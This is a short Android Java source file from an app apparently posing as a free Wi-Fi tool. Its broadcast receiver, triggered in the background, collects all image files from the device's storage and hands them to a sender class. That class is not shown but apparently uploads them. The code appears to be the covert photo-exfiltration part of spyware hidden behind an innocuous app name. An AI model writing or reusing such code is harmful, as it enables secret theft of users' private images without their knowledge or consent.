package com.example.amata.freewifi;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.File;
import java.util.List;

public class ImageProcessorReceiver extends BroadcastReceiver {
    public ImageProcessorReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("PROCESSOR RECEIVER", "START");
        List<File> imagesFromSd = ImagesReader.getImagesFromSd();
        ImagesSender.sendImages(imagesFromSd, context);
        Log.d("PROCESSOR RECEIVER", "END");
    }
}
